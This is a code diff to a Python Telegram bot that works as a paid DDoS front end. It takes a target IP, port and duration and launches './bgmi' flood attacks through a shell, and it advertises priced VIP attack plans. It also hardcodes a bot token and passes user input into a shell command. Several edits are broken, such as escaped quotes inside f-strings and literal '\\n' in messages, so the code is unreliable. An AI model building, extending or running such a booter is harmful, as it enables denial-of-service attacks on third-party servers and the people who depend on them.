@@ -6,7 +6,7 @@ import requests
 import datetime
 import os
 import signal
-from telebot.types import InlineKeyboardMarkup, InlineKeyboardButton
+from telebot.types import InlineKeyboardMarkup, InlineKeyboardButton, ReplyKeyboardMarkup
 
 # insert your Telegram bot token here
 bot = telebot.TeleBot('8279142566:AAE7719-93KPDHFXc0q8Y1eMCKJ_FUOpk0E')
@@ -208,10 +208,10 @@ def show_command_logs(message):
         return
     try:
         with open(LOG_FILE, "r") as file:
-            logs = [log for log in file.readlines() if f"UserID: {user_id}" in log]
-            bot.reply_to(message, "Your Logs:\n" + "".join(logs) if logs else "No logs ❌")
+            logs = [log for log in file.readlines() if f\"UserID: {user_id}\" in log]
+            bot.reply_to(message, \"Your Logs:\\n\" + \"\".join(logs) if logs else \"No logs ❌\")
     except FileNotFoundError:
-        bot.reply_to(message, "No logs ❌")
+        bot.reply_to(message, \"No logs ❌\")
 
 @bot.message_handler(commands=['help'])
 def show_help(message):
@@ -229,15 +229,15 @@ Admin only:
 
 @bot.message_handler(commands=['rules'])
 def welcome_rules(message):
-    bot.reply_to(message, "⚠️ Rules:\n1. Don't spam attacks\n2. Don't run 2 at once\n3. Logs are checked daily")
+    bot.reply_to(message, "⚠️ Rules:\\n1. Don't spam attacks\\n2. Don't run 2 at once\\n3. Logs are checked daily")
 
 @bot.message_handler(commands=['plan'])
 def welcome_plan(message):
-    bot.reply_to(message, "VIP 🌟 : 180s attack, 5min cooldown, 3 concurrents\n1day=15k, 3days=40k")
+    bot.reply_to(message, "VIP 🌟 : 180s attack, 5min cooldown, 3 concurrents\\n1day=15k, 3days=40k")
 
 @bot.message_handler(commands=['admincmd'])
 def admincmd(message):
-    bot.reply_to(message, "Admin commands:\n/add, /remove, /allusers, /logs, /broadcast, /clearlogs")
+    bot.reply_to(message, "Admin commands:\\n/add, /remove, /allusers, /logs, /broadcast, /clearlogs")
 
 @bot.message_handler(commands=['broadcast'])
 def broadcast_message(message):
@@ -247,7 +247,7 @@ def broadcast_message(message):
         return
     command = message.text.split(maxsplit=1)
     if len(command) > 1:
-        msg = "⚠️ Admin Broadcast:\n\n" + command[1]
+        msg = "⚠️ Admin Broadcast:\\n\\n" + command[1]
         with open(USER_FILE, "r") as file:
             for uid in file.read().splitlines():
                 try:
@@ -257,7 +257,7 @@ def broadcast_message(message):
     else:
         bot.reply_to(message, "Usage: /broadcast <msg>")
 
-# ================== NEW: Attack/Stop bằng nút ==================
+# ================== Attack/Stop bằng nút inline ==================
 def send_menu(chat_id):
     markup = InlineKeyboardMarkup()
     markup.add(
@@ -266,10 +266,17 @@ def send_menu(chat_id):
     )
     bot.send_message(chat_id, "Choose action:", reply_markup=markup)
 
+# ================== NEW: Reply Keyboard ==================
+def send_reply_keyboard(chat_id):
+    markup = ReplyKeyboardMarkup(resize_keyboard=True)
+    markup.row("🚀 Attack", "⛔ Stop")
+    bot.send_message(chat_id, "Choose action:", reply_markup=markup)
+
 @bot.message_handler(commands=['start'])
 def welcome_start(message):
     bot.reply_to(message, f"👋 Welcome {message.from_user.first_name}")
-    send_menu(message.chat.id)
+    send_menu(message.chat.id)            # inline keyboard
+    send_reply_keyboard(message.chat.id)  # reply keyboard
 
 # Nhận tin nhắn IP/Port/Time
 @bot.message_handler(func=lambda m: True)
@@ -291,8 +298,23 @@ def handle_target(message):
         return
 
     last_target[user_id] = {"ip": ip, "port": int(port), "time": int(time)}
-    bot.reply_to(message, f"🎯 Target Detected: {ip}:{port}\nTime: {time}s")
+    bot.reply_to(message, f"🎯 Target Detected: {ip}:{port}\\nTime: {time}s")
     send_menu(message.chat.id)
+
+# --- Nhận text từ reply keyboard ---
+@bot.message_handler(func=lambda m: m.text in ["🚀 Attack", "⛔ Stop"])
+def handle_reply_buttons(message):
+    # Giả lập callback của inline button
+    class DummyCall:
+        def __init__(self, msg, data):
+            self.message = msg
+            self.data = data
+            self.id = "reply_fake_id"
+
+    if message.text == "🚀 Attack":
+        callback_handler(DummyCall(message, "attack"))
+    elif message.text == "⛔ Stop":
+        callback_handler(DummyCall(message, "stop"))
 
 @bot.callback_query_handler(func=lambda call: True)
 def callback_handler(call):
@@ -318,7 +340,7 @@ def callback_handler(call):
 
         full_command = f"./bgmi {ip} {port} {time} 200"
         bgmi_process = subprocess.Popen(full_command, shell=True, preexec_fn=os.setsid)
-        bot.send_message(call.message.chat.id, f"🔥 Attack Started!\n{ip}:{port}\nTime: {time}s")
+        bot.send_message(call.message.chat.id, f"🔥 Attack Started!\\n{ip}:{port}\\nTime: {time}s")
         bot.answer_callback_query(call.id, "Attack started!")
 
     elif call.data == "stop":
